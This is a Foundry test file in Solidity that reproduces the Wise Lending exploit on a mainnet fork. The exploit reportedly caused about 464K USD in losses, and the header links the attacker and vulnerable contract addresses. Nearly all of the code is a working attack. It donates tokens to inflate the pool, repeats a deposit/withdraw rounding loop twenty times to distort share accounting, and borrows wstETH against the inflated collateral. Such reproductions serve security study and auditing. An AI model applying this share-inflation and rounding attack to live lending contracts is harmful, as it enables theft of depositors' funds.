// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "./../interface.sol";

// @KeyInfo - Total Lost : ~464K USD$
// Attacker : https://etherscan.io/address/0xb90cf1d740b206b6d80854bc525e609dc42b45dc
// Attack Contract : https://etherscan.io/address/0x91c49cc7fbfe8f70aceeb075952cd64817f9d82c
// Vulnerable Contract : https://etherscan.io/address/0x37e49bf3749513a02fa535f0cbc383796e8107e4
// Attack Tx :https://etherscan.io/tx/0x04e16a79ff928db2fa88619cdd045cdfc7979a61d836c9c9e585b3d6f6d8bc31

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x37e49bf3749513a02fa535f0cbc383796e8107e4

// @Analysis
// Twitter alert by Exvul : https://twitter.com/EXVULSEC/status/1746138811862577515
// Twitter alert by Peckshield: https://twitter.com/peckshield/status/1745907642118123774

contract WiseLendingTest is Test {
    IWiseLending public wiseLending = IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));

    NFTManager public nft = NFTManager(0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61);

    uint256 blockNumber = 18_983_652;

    // PLP-stETH-Dec2025
    address poolToken = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;

    address pendleLPT = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2;

    address other;

    address wsteth = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    address wstethOracle = 0x9aB8A49677a20fc0cC694479DF4462a82B4Cc1C4;

    address wiseSecurity = 0x829c3AE2e82760eCEaD0F384918a650F8a31Ba18;

    uint256 constant MAX = type(uint256).max;

    function setUp() public {
        vm.createSelectFork("mainnet", blockNumber);

        vm.label(address(wiseLending), "wiseLending");
        vm.label(address(poolToken), "poolToken");
        vm.label(address(pendleLPT), "pendleLPT");
        vm.label(address(other), "other");
        vm.label(wsteth, "wsteth");
        vm.label(wstethOracle, "wstethOracle");
        vm.label(wiseSecurity, "wiseSecurity");
        other = vm.addr(123_123);
    }

    function test_poc() public {
        deal(pendleLPT, address(this), 1 ether);

        IERC20(pendleLPT).approve(poolToken, MAX);

        Pool(poolToken).depositExactAmount(1 ether);

        IERC20(poolToken).approve(address(wiseLending), MAX);

        uint256 nftId = nft.mintPosition();

        wiseLending.depositExactAmount(nftId, poolToken, 1e9);

        IERC20(poolToken).transfer(address(wiseLending), 1e9);

        (uint256 pseudoTotalPool, uint256 totalDepositShares,) = wiseLending.lendingPoolData(poolToken);

        skip(5 seconds);

        uint256 share = wiseLending.getPositionLendingShares(nftId, poolToken);

        // withdraw all shares
        wiseLending.withdrawExactShares(nftId, poolToken, share);

        uint256 i = 0;
        do {
            (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);
            share = wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);

            wiseLending.withdrawExactAmount(nftId, poolToken, share);
            ++i;
        } while (i < 20);

        (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);
        share = wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);
        (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);

        IERC20(poolToken).transfer(other, IERC20(poolToken).balanceOf(address(this)));
        vm.startPrank(other);
        nftId = nft.mintPosition();
        IERC20(poolToken).approve(address(wiseLending), MAX);

        wiseLending.depositExactAmount(nftId, poolToken, IERC20(poolToken).balanceOf(other));

        uint256 amount = IWiseSecurity(wiseSecurity).maximumBorrowToken(nftId, poolToken, 0);

        wiseLending.borrowExactAmount(nftId, wsteth, amount);
    }

    function _simulateOracleCall() internal {
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
            Oracle(wstethOracle).latestRoundData();
        vm.mockCall(
            wstethOracle,
            abi.encodeCall(Oracle.latestRoundData, ()),
            abi.encode(roundId, answer, block.timestamp, block.timestamp, answeredInRound)
        );

        uint80 _roundId;
        (_roundId, answer, startedAt, updatedAt, answeredInRound) = Oracle(wstethOracle).getRoundData(roundId);

        vm.mockCall(
            wstethOracle,
            abi.encodeCall(Oracle.getRoundData, (roundId)),
            abi.encode(_roundId, answer, block.timestamp, block.timestamp, answeredInRound)
        );
    }
}

interface Pool {
    function depositExactAmount(uint256 _underlyingLpAssetAmount) external returns (uint256, uint256);
    function getPositionLendingShares(uint256, address) external returns (uint256);
}

interface NFTManager {
    function mintPosition() external returns (uint256);
}

interface Oracle {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);

    function getRoundData(uint80 _roundId)
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

interface IWiseLending {
    function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);

    function withdrawExactShares(uint256 _nftId, address _poolToken, uint256 _shares) external returns (uint256);

    function withdrawExactAmount(
        uint256 _nftId,
        address _poolToken,
        uint256 _withdrawAmount
    ) external returns (uint256);

    function getPositionLendingShares(uint256 _nftId, address _poolToken) external view returns (uint256);

    function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);

    function lendingPoolData(address _poolToken)
        external
        view
        returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);
}

interface IWiseSecurity {
    function maximumBorrowToken(
        uint256 _nftId,
        address _poolToken,
        uint256 _interval
    ) external view returns (uint256 tokenAmount);
}
